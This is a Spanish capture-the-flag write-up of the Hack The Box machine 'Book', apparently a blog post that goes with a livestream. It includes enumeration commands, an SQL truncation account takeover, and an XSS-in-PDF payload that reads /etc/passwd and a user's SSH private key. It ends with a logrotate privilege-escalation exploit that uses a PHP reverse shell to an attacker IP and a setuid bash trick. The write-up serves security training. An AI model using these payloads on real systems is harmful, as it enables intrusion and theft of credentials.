---
layout: post
title: HTB_Book
date: 2023/07/10
slug: HTB_Book
heroImage: /assets/machines.jpg
---

# Book {-}

## Introduccion {-}

La maquina del dia se llama Book.

El replay del live se puede ver aqui

[![S4vitaar Book maquina](https://img.youtube.com/vi/0vmm0I644fs/0.jpg)](https://www.youtube.com/watch?v=0vmm0I644fs)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.176
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.176
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.176 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,443,445,3306 10.10.10.176 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?            |
| ------ | -------- | ------------------ | --------------------- |
| 22     | ssh      | Direct connection  | credenciales o id_rsa |
| 80     | http     | Web Fuzzing        |                       |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.176
```

Es un Apache 2.4.29 Ubuntu que usa PHP 7.3.4. Vemos un password field que nos hace pensar que estamos
en un panel de inicio de session.

#### Mini fuzzing con http-enum {-}

```bash
nmap --script http-enum -p80 10.10.10.176 -oN webScan
```

Vemos un directorio 
```bash
 /admin 
```


#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.176 
```
, Vemos una pagina que nos permite loggear o registrar. En la pagina 
```bash
 http://10.10.10.176/admin 
```
 tenemos un
otro panel de inicio de session para el panel de administracion.

Empezamos por crear una cuenta
y nos loggeamos.

Aqui vemos una biblioteca. Podemos

- ver libros en pdf
- añadir un libro a la coleccion
- contactar el administrator

Haciendo Hovering a las imagenes de la pagina 
```bash
 books.php 
```
, vemos que hay un link a 
```bash
 http://10.10.10.176/download.php?file=1 
```


Miramos con curl si es vulnerable a LFI

```bash
curl -s -X GET "http://10.10.10.176/download.php?file=/etc/passwd"
curl -s -X GET "http://10.10.10.176/download.php?file=/etc/passwd -L"
curl -s -X GET "http://10.10.10.176/download.php?file=../../../../../../etc/passwd"
curl -s -X GET "http://10.10.10.176/download.php?file=../../../../../../etc/passwd -L"
```

No parece ser vulnerable en este caso.

En las paginas 
```bash
 /collections.php 
```
 y 
```bash
 /contact.php 
```
 vemos que las request necessitan ser validadas por otro usuario. Miramos si es vulnerable a un XSS

```bash
python3 -m http.server 80
```

y ponemos en los inputs de la web 

```bash
<script src="http://10.10.17.51/book" />
<script src="http://10.10.17.51/title" />
<script src="http://10.10.17.51/message" />
```

No parece ser vulnerable a XSS tampoco.

Miramos si podemos burlar el login. Nos desloggeamos y miramos lo que podemos hacer desde el panel de inicio de session.
Intentamos en el panel login poner usuarios por defecto.

```bash
email: admin@book.htb
password: admin
```

Vemos que el usuario admin existe pero la contraseña no es la buena.

Miramos si el panel de inicio de session es vulnerable a un **SQLI**. lo hacemos desde burpsuite.

```bash
email=admin@book.htb'&password=admin
email=admin@book.htb' and 1=1-- -&password=admin
email=admin@book.htb' and 1=1#&password=admin
email=admin@book.htb' or sleep(5)&password=admin
```

No parece que este panel sea vulnerable a **SQLI**.

Probamos si es vulnerable a **Type Juggling**.

```bash
email[]=admin@book.htb&password[]=admin
```

Tampoco parece ser vulnerable a un **Type Juggling**
## Vulnerability Assessment {-}

### SQL Truncate {-}

**SQL Truncate** es una vulnerabilidad que viene del echo que un input de usuario no esta sanitizado en terminos de *length* y que 
la columna corespondiente en el SQL esta definida con un tamaño. Esta vulnerabilidad permite al atacante modificar el comportamiento
de la peticion sql. En un caso como este, y mas precisamente en el panel de registo, en vez de crear un nuevo usuario, podriamos como
atacante cambiar la contraseña de este mismo usuario superando el tamaño definido en SQL.

Si el tamaño definido por la columna 
```bash
 email 
```
 es 
```bash
 varchar(16) 
```
, si como atacante ponemos el email 
```bash
 admin@book.htb 
```
 con espacios al final mas
cualquier carater y que en este caso excede este tamaño de 16, podriamos cambiar su contraseña.

Si en burpsuite creamos un usuario con la data

```bash
name=admin&email=admin@book.htb&password=admin123
```

la respuesta al lado del servidor nos dice que el usuario ya existe. pero si excedemos el tamaño definido en la columna de la tabla SQL con
una peticion 

```bash
name=admin&email=admin@book.htb               .&password=admin123
```

la respuesta es un 302 Found.

Si nos connectamos ahora como 
```bash
 admin 
```
 y con la contraseña 
```bash
 admin123 
```
, podemos entrar como el usuario admin.
En este caso vamos directamente a la url 
```bash
 http://10.10.10.176/admin 
```
 para entrar en el panel de administracion de la web.

Aqui Vemos que podemos ver los usuarios registrados, los mensajes enviados por los usuarios los feedbacks y la collections.

Aqui nos llama la atencion el 
```bash
 /admin/collections.php 
```
 porque hay un link a un pdf de la collectiones de la web.
Si nos acordamos bien, el contenido es muy parecido a las entradas que teniamos como usuario normal a la hora de crear una nueva
collection.

Si nos connectamos en una nueva pagina web al panel normal (el donde podiamos crear una nueva collection) y creamos una nuevamente
con

```bash
title: test
author: test
un fichero txt en el file upload
```

Podemos ver que esta collection a sido creada y aparece en el pdf de la collections de panel de administracion y nos reporta la data title y author.

Buscamos en internet si existe un html 2 pdf exploit.

### html2pdf exploit {-}

Buscamos por 
```bash
 html 2 pdf exploit 
```
, no vemos gran cosa. Cambiamos la busqueda por vulnerabilidades conocidas como RCE LFI XSS
y encontramos un un [Local File Read via XSS in Dynamically Generated PDF](https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/)

Aqui vemos que con la inclusion de un 
```bash
 <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script> 
```

podriamos ejecutar un LFI.

Si lo ponemos en el input Title y author, podemos ver el 
```bash
 /etc/passwd 
```
 de la maquina en el pdf generado.

En este caso vemos que hay un usuario 
```bash
 Reader 
```
 que tiene una bash. Miramos si podemos leer su 
```bash
 id_rsa 
```



```bash
 <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script> 
```


Ya podemos ver su llave privada y connectarnos por ssh.
## Vuln exploit & Gaining Access {-}

### Conneccion por ssh con id_rsa {-}

1. Copiamos el contenido de la id_rsa del pdf en un fichero id_rsa en nuestra maquina.
1. Le ponemos los derechos necesarios

    ```bash
    chmod 600 id_rsa
    ```

1. Nos connectamos

    ```bash
    ssh reader@10.10.10.176 -i id_rsa
    ```

Y ya estamos connectados como el usuario **reader** y podemos leer la flag.## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
ls -l
cd backups
ls -l
cat access.log
cat access.log.1
```

Aqui no tenemos mucha cosa que podemos hacer. Uzamos **pspy** para investigar el systema.

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
./pspy64
```

pspy nos muestra que hay un 
```bash
 /usr/sbin/logrote 
```
 que se ejecuta a interval regular de tiempo.

```bash
uname -a
logrotate -v
```

En la maquina de atacante buscamos un exploit logrotate para escalada de privilegios

```bash
searchsploit logrot
searchsploit -m 47466
mv 47466.c logrotten.c
```

Copiamos el contenido en un fichero de la maquina victima y le quitamos todos los commentarios.

```bash
gcc logrotten.c -o logrotten
```

Creamos un fichero payloadfile malicioso

```bash
nano payloadfile


#!/bin/bash

php -r '$sock=fsockopen("10.10.17.51",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Nos ponemos en escucha por el puerto 443

```bash
nc -nlvp 443
```

Lanzamos el script

```bash
logrotten -p payloadfile /home/reader/backups/access.log
```

Nos conectamos nuevamente por ssh a la maquina victima para modificar el fichero 
```bash
 access.log 
```


```bash
ssh reader@10.10.10.176 -i id_rsa

echo "s4vitar" > backups/access.log
```

Esperamos un poco y ganamos accesso al systema. Pero se desconecta bastante rapido. Volvemos nuevamente a lanzar el script
y rapidamente colamos un 
```bash
 chmod 4755 /bin/bash 
```
 de seguida que ganamos accesso al systema antes que se desconnecte.

Desde una shell ssh ya podemos lanzar un 
```bash
 bash -p 
```
 y leer el fichero 
```bash
 root.txt 
```
